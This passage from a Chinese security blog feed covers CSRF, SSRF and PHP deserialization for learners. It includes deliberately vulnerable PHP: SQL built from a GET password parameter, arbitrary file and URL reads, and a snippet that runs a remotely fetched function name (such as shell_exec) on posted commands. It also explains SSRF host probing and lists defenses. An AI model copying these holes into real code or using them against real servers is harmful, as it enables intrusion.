class="hljs-variable">$sql</span>=escape(<span class="hljs-variable">$link</span>,<span class="hljs-variable">$sql</span>);<span class="hljs-comment">//转义字符串</span><br><span class="hljs-variable">$result</span>=execute(<span class="hljs-variable">$link</span>,<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$column</span>=@mysqli_fetch_array(<span class="hljs-variable">$result</span>))&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>]===<span class="hljs-variable">$column</span>[<span class="hljs-string">&#x27;username&#x27;</span>])&#123;<br><span class="hljs-variable">$sql2</span>=<span class="hljs-string">&quot;update users set password=&#x27;<span class="hljs-subst">&#123;$_GET[&#x27;password&#x27;]&#125;</span>&#x27; where username=&#x27;<span class="hljs-subst">&#123;$_SESSION[&#x27;user&#x27;]&#125;</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$result</span>=execute(<span class="hljs-variable">$link</span>,<span class="hljs-variable">$sql2</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;span style=&#x27;margin-left:36%;&#x27; content=‘3;URL=login.html’&gt;密码修改成功！三秒后返回登录界面。&lt;/sapn&gt; | &quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;a style=&#x27;color:red;&#x27; href=&#x27;login.html&#x27;&gt;直接前往！&lt;/a&gt;&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>header(<span class="hljs-string">&#x27;location:manage.php&#x27;</span>);<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>header(<span class="hljs-string">&#x27;location:manage.php&#x27;</span>);<br>&#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>header(<span class="hljs-string">&#x27;location:manage.php&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>  因为这里设计的用户名部分是通过<code>$_SESSION</code>超级变量来获取的，所以漏洞触发地点也必须是在网站内部。这个是比较简单，只要利用一个标签就可以诱惑用户，危害明显比较大。再看看另一种提交方式：</p><img src="/2021/05/09/CSRF%E5%92%8CSSRF%E5%B8%A6%E6%9D%A5%E7%9A%84WEB%E6%BC%8F%E6%B4%9E/3.jpg" class="" title="CSRF和SSRF带来的WEB漏洞"><p>  这个是post类型传参方式，相对于get型传参，它的CSRF攻击方式会更加麻烦一点，因为post类型不会形成一个URL，所以，要形成一个post类型的CSRF攻击，一般都会选择做一个钓鱼网站，界面的东西看起来是和正常无害界面一样，但后面的代码确实对传入的数据进行另类处理。不过，现在的互联网用户越来越多，大家对钓鱼网站也有了自己的认识，轻易不会上当。所以，在我看来，这个WEB漏洞存在的意义不大。</p><h5 id="防御方式："><a href="#防御方式：" class="headerlink" title="防御方式："></a>防御方式：</h5><ol><li>设置和判断cookie时采用hash值认证，一般攻击者再看到hash值时扭头就走，原因自然是不言而喻。</li><li>尽量采用post类型传参，这就减少了请求被直接伪造的可能。</li><li>采用验证码判断，这也是一道艰难的工程，想识别验证码的步骤就有点繁杂了。</li></ol><p>  SSRF的全称是服务端请求伪造（Server-Side Request Forgery），由于某些应用需要调用其他服务器上的资源，需要传入一个目标地址提供给服务器请求，这就会造成攻击者利用该地址促使服务器访问内网的其他服务，简单说，SSRF就是通过获取资源的请求发送给服务器，利用一个服务器做跳板来访问其他服务器上的资源，适用于主机信息收集、WEB应用指纹识别、根据应用识别payload进行攻击和拒绝服务攻击。</p><h3 id="SSRF实例："><a href="#SSRF实例：" class="headerlink" title="SSRF实例："></a>SSRF实例：</h3><p>  有csrf的基础，ssrf看起来就比较简单，可以利用权限较高的服务器的身份来访问其他服务器上的资源。这里举一个远程文件读取函数使用不当造成的ssrf漏洞：</p><img src="/2021/05/09/CSRF%E5%92%8CSSRF%E5%B8%A6%E6%9D%A5%E7%9A%84WEB%E6%BC%8F%E6%B4%9E/4.jpg" class="" title="CSRF和SSRF带来的WEB漏洞"><p>再看一下ssrf.php文件源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">&#x27;Content-Type:image/png&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;p&#x27;</span>]==<span class="hljs-number">1</span>)&#123;<br><span class="hljs-variable">$file</span>=<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;img&#x27;</span>])?<span class="hljs-literal">FALSE</span>:<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;img&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span>)&#123;<br><span class="hljs-variable">$fp</span>=fopen(<span class="hljs-variable">$file</span>, <span class="hljs-string">&#x27;r&#x27;</span>);<br><span class="hljs-variable">$result</span>=fread(<span class="hljs-variable">$fp</span>,filesize(<span class="hljs-variable">$file</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br>fclose(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;1&lt;hr /&gt;&#x27;</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;p&#x27;</span>]==<span class="hljs-number">2</span>)&#123;<br><span class="hljs-variable">$file</span>=<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;img&#x27;</span>])?<span class="hljs-literal">FALSE</span>:<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;img&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span>)&#123;<br><span class="hljs-variable">$result</span>=file_get_contents(<span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;2&lt;hr /&gt;&#x27;</span>;<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>第二个判断语句中，执行了一个远程文件读取的方法<code>file_get_contents()</code>，就相当与可以借助这台服务器来访问其他服务器上的内容，这就是一个前提条件。当然，如果存在第一个判断语句里面的内容，那还可以使用其他的伪协议 ，例如file协议，ftp协议等等。当然，一般程序员是不会直接输出文件内容的，不过这个可以用来判断服务器开了哪些主机存活，可以利用一些站点常见的文件来实现，比如favicon.ico文件，根据返回时间长短可以判断该主机是否存在，存在的主机返回的速度很快，一般多是1秒之内，不存在的主机返回速度很慢，大概会超过20秒。</p><h5 id="SSRF漏洞出现位置："><a href="#SSRF漏洞出现位置：" class="headerlink" title="SSRF漏洞出现位置："></a>SSRF漏洞出现位置：</h5><ol><li>通过URL地址分享网页内容；</li><li>转码服务；</li><li>在线翻译；</li><li>通过URL地址加载与下载图片；</li><li>图片、文章收藏功能；</li><li>未公开的API实现以及其他调用URL的功能；</li><li>从URL关键字中寻找share、wap、url、link、src、source、target、u、3g、display、sourceURL、imageURL、domain等等可控关键字。</li></ol><h5 id="SSRF远程文件访问："><a href="#SSRF远程文件访问：" class="headerlink" title="SSRF远程文件访问："></a>SSRF远程文件访问：</h5><p>  这里举例一个SSRF的远程文件访问操作，先看一触发的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">#ssrf_far.php<br>&lt;?php<br>$str&#x3D;$_POST[&#39;url&#39;];<br>$str&#x3D;file_get_contents($str);<br>$str($_POST[&#39;cmd&#39;]);<br>?&gt;<br></code></pre></td></tr></table></figure><p>这里就是一个程序员在做远程访问的时候常见的三行代码，有这三行代码存在，就会造成上述漏洞，再看一下执行效果：</p><img src="/2021/05/09/CSRF%E5%92%8CSSRF%E5%B8%A6%E6%9D%A5%E7%9A%84WEB%E6%BC%8F%E6%B4%9E/5.jpg" class="" title="CSRF和SSRF带来的WEB漏洞"><p>这里ssrf_far.php中含有造成远程文件访问漏洞的代码，恶意攻击者就会利用该效果将URL地址定向到一个自己可以控制的服务器的站点文件内，就比如这里的assert.txt文件中写的内容就是<code>shell_exec</code>，这样就将ssrf_far.php文件的第三行代码变成了一个可以执行系统命令的php函数，造成一个危险操作。</p><h5 id="防御方式：-1"><a href="#防御方式：-1" class="headerlink" title="防御方式："></a>防御方式：</h5><ol><li>过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</li><li>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</li><li>限制请求的端口为http常用的端口，比如：80、443等。</li><li>黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。</li><li>禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。</li></ol><h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>  因为我也是最近刚刚开始接触csrf和ssrf，所以对它们的理解不是很深刻，总感觉理解不到里面的奥义，希望有师傅能带带我，指点一下迷津。</p><img src="/2021/05/09/CSRF%E5%92%8CSSRF%E5%B8%A6%E6%9D%A5%E7%9A%84WEB%E6%BC%8F%E6%B4%9E/QQ.png" class="" title="CSRF和SSRF带来的WEB漏洞">]]></content>
    
    
    <categories>
      
      <category>常见漏洞基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>csrf</tag>
      
      <tag>ssrf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php反序列化使用不当造成的漏洞</title>
    <link href="/2021/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93%E9%80%A0%E6%88%90%E7%9A%84%E6%BC%8F%E6%B4%9E/"/>
    <url>/2021/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93%E9%80%A0%E6%88%90%E7%9A%84%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>  这几天进入了一个疯狂的划水期，作为一个十成十的菜鸟，跟着学长们见识一下CTF的乐趣所在，还真别说，真香。。。。原本是决定借这一次提高一下自己，结果被虐得体无完肤，特别是WEB方面，反序列化这一块就让我很难受，所以准备写这一篇博客纪念一下自己的菜。。。。。</p><p>参考文献：<a href="https://www.bilibili.com/video/av41677248?from=search&seid=16309505071500820353">Amber小姐姐的讲解视频</a></p><h3 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h3><p>  献上一波自己对序列化和反序列化的理解：php中，序列化就是将一个类的对象转换成一个有一定序列格式的字符串，反之，反序列化就是将这一串有一定序列格式的字符串转换成一个类的对象的过程。其中，php中序列化对应的原型函数为<code>string serialize ( mixed $value )</code>，反序列化对应的原型函数为<code>string unserialize ( mixed $value )</code>。</p><p>ps：对于一个类来说，它的对象可以有该类的属性和方法，但序列化的字符串只记录该对象的属性及属性值。可能在这里有点 抽象，不过下面的例子会有更详细的解释。</p><p>这里先做一个序列化和反序列化的实例演示（手写的，有点挫劣）：</p><img src="/2021/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93%E9%80%A0%E6%88%90%E7%9A%84%E6%BC%8F%E6%B4%9E/1.jpg" class="" title="php反序列化使用不当造成的漏洞"><p>代码下面阴影区就是输出的结果，同样，对于反序列化的就是</p><img src="/2021/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93%E9%80%A0%E6%88%90%E7%9A%84%E6%BC%8F%E6%B4%9E/2.jpg" class="" title="php反序列化使用不当造成的漏洞"><p>序列化和反序列化的常见操作便像是如此，这里先送上一波源码（其实是我懒，以后代码不小心被删了，就来这里找）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#serialize.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MySerialize</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$nature1</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$nature2</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$nature1</span>, <span class="hljs-variable">$nature2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;nature1 = <span class="hljs-variable">$nature1</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;nature2 = <span class="hljs-variable">$nature2</span>;<br>    &#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">method</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;I am method&quot;</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-variable">$target</span> = <span class="hljs-keyword">new</span> MySerialize(<span class="hljs-string">&quot;value1&quot;</span>,<span class="hljs-string">&quot;value2&quot;</span>);<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$target</span>);<br><span class="hljs-meta">?&gt;</span><br><br><br><span class="hljs-comment">#unserialize.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MySerialize</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$nature1</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$nature2</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$nature1</span>, <span class="hljs-variable">$nature2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;nature1 = <span class="hljs-variable">$nature1</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;nature2 = <span class="hljs-variable">$nature2</span>;<br>    &#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;wakeup&lt;br \&gt;&quot;</span>;<br>    &#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">method</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;I am method&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-variable">$target</span> = <span class="hljs-string">&#x27;O:11:&quot;MySerialize&quot;:2:&#123;s:7:&quot;nature1&quot;;s:6:&quot;value1&quot;;s:7:&quot;nature2&quot;;s:6:&quot;value2&quot;;&#125;&#x27;</span>;<br>var_dump(unserialize(<span class="hljs-variable">$target</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="序列化："><a href="#序列化：" class="headerlink" title="序列化："></a>序列化：</h4><p>  接下来对上面的代码做一波解释，这里先介绍一下序列化后带格式的字符串的意思，在上面的<code>serialize.php</code>运行过后，可以看到一串有规律的字符串：<code>O:11:&quot;MySerialize&quot;:2:&#123;s:7:&quot;nature1&quot;;s:6:&quot;value1&quot;;s:7:&quot;nature2&quot;;s:6:&quot;value2&quot;;&#125;</code>，这串字符串就规定了这个对象的属性和属性值。对于一个序列化字符串，其中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">object module:<br>O--&gt;Object，表示后面的变量的属性类型是Object类型，用法：O:size:&quot;value&quot;:num:&#123;propety module&#125;;<br>  a--&gt;Array，表示后面的变量的属性类型是Array类型，用法：a:size:&#123;propety module&#125;;<br>propety module:<br>  S--&gt;String，表示后面的变量的属性类型是String类型，用法：s:size:&quot;value&quot;;<br>  i--&gt;Integer，表示后面的变量的属性类型是Integer类型，用法：i:value;<br>  b--&gt;Boolean，表示后面的变量的属性类型是Boolean类型，用法：b:value（这里的value只有1和0）；<br>  N--&gt;NULL，表示后面的变量值为空，用法：N；<br></code></pre></td></tr></table></figure><p>  对比上面的解释，字符串<code>O:11:&quot;MySerialize&quot;:2:&#123;s:7:&quot;nature1&quot;;s:6:&quot;value1&quot;;s:7:&quot;nature2&quot;;s:6:&quot;value2&quot;;&#125;</code>就可以被解释为类对象<code>MySerialize</code>长度为11，有2个属性名：第一个属性名<code>nature1</code>是<code>string</code>类型，长度为7，它的属性值为<code>value1</code>，是<code>string</code>类型，长度为6；第二个属性名<code>nature2</code>是<code>string</code>类型，长度为7，它的属性值为<code>value2</code>，是<code>string</code>类型，长度为6。</p><h4 id="反序列化："><a href="#反序列化：" class="headerlink" title="反序列化："></a>反序列化：</h4><p>  谈完序列化，再来说说反序列化，这是一个逆序操作，将一个序列化字符串转换成一个对象或数组的过程。反序列化中最神奇的地方就是反序列化会触发特殊的魔法函数，就好像创建类对象的时候会触发它的构造函数一样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">_construct()：创建一个对象时会被调用。<br>_destruct()：销毁一个对象时会被调用。<br>_wakeup()：触发unserialize()方法时会被调用。<br>_sleep()：触发serialize()方法时会被调用。<br>_toString()：类对象被当作一个字符串使用时会被调用。<br>_get()：调出不可访问（<span class="hljs-keyword">private</span>，protect等修饰）属性时会被调用。<br>_set()：修改或写入不可访问（<span class="hljs-keyword">private</span>，protect等修饰）属性时会被调用。<br>_isset()：对不可访问（<span class="hljs-keyword">private</span>，protect等修饰）属性使用<span class="hljs-keyword">empty</span>()或<span class="hljs-keyword">isset</span>()方法时会被调用。<br>_unset()：对不可访问（<span class="hljs-keyword">private</span>，protect等修饰）属性使用<span class="hljs-keyword">unset</span>()方法时会被调用。<br>_invoke()：将实例化对象当作方法使用时会被调用。<br></code></pre></td></tr></table></figure><h5 id="详细说明及举例："><a href="#详细说明及举例：" class="headerlink" title="详细说明及举例："></a>详细说明及举例：</h5><ol><li><p><code>_construct()</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#unserialize1.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MySerialize</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$nature1</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$nature2</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$nature1</span>, <span class="hljs-variable">$nature2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;nature1 = <span class="hljs-variable">$nature1</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;nature2 = <span class="hljs-variable">$nature2</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;i am here!&quot;</span>;<br>    &#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">method</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;I am method!&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-variable">$target</span> = <span class="hljs-keyword">new</span> MySerialize(<span class="hljs-string">&quot;value1&quot;</span>,<span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>.serialize(<span class="hljs-variable">$target</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>执行结果：</p><img src="/2021/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93%E9%80%A0%E6%88%90%E7%9A%84%E6%BC%8F%E6%B4%9E/3.jpg" class="" title="php反序列化使用不当造成的漏洞"><p>  按理说这个函数应该归类在序列化里面，因为它只有在创建对象的时候才会被调用，不过它也是个魔法函数，所以就将它放到这里，从上面的演示中可以看到，_construct()函数中的echo语句执行在serialize方法之前，也就是创建MySerialize对象的时候。</p></li><li><p><code>_destruct()</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#unserialize2.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MySerialize</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$nature1</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$nature2</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br /&gt;I am here!&quot;</span>;<br>    &#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">method</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;I am method&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-variable">$target</span> = <span class="hljs-string">&#x27;O:11:&quot;MySerialize&quot;:2:&#123;s:7:&quot;nature1&quot;;s:6:&quot;value1&quot;;s:7:&quot;nature2&quot;;s:6:&quot;value2&quot;;&#125;&#x27;</span>;<br>var_dump(unserialize(<span class="hljs-variable">$target</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>执行结果：</p><img src="/2021/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93%E9%80%A0%E6%88%90%E7%9A%84%E6%BC%8F%E6%B4%9E/4.jpg" class="" title="php反序列化使用不当造成的漏洞"><p>  _destruct()方法就如同析构方法一样，在一个类执行完之后会自动调用，也就是说，如果在该方法中含有危险操作函数，那就有可能存在该函数被恶意执行的可能，比如，在该函数中写有<code>system($a)</code>方法，并且<code>$a=unserialize(可控值)</code>，那么，这里就可能通过可控值来执行操作。</p></li><li><p><code>_toString()</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#unserialize3.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MySerialize</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$nature1</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$nature2</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br /&gt;I am here!&quot;</span>;<br>    &#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">method</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;I am method&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-variable">$target</span> = <span class="hljs-string">&#x27;O:11:&quot;MySerialize&quot;:2:&#123;s:7:&quot;nature1&quot;;s:6:&quot;value1&quot;;s:7:&quot;nature2&quot;;s:6:&quot;value2&quot;;&#125;&#x27;</span>;<br><span class="hljs-keyword">echo</span> unserialize(<span class="hljs-variable">$target</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>执行结果：</p><img src="/2021/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93%E9%80%A0%E6%88%90%E7%9A%84%E6%BC%8F%E6%B4%9E/5.jpg" class="" title="php反序列化使用不当造成的漏洞"><p>  这里在执行完<code>unserialize()</code>方法后用<code>echo</code>进行输出，因为此时<code>unserialize()</code>方法的返回值是一个含该魔法函数的对象，而该对象又被当作字符串输出，所以会触发该魔法函数。同样的道理，如果该函数中含有字符串处理的危险函数，就有可能造成源码源码泄漏。比如该魔法函数中存在<code>file_get_contents($file)</code>方法，而$file变量指向某个原本不允许直接访问的文件，并且魔法函数的触发方法可控，就会造成源码泄漏。</p></li><li><p><code>_sleep()</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#unserialize3.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MySerialize</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$nature1</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$nature2</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span 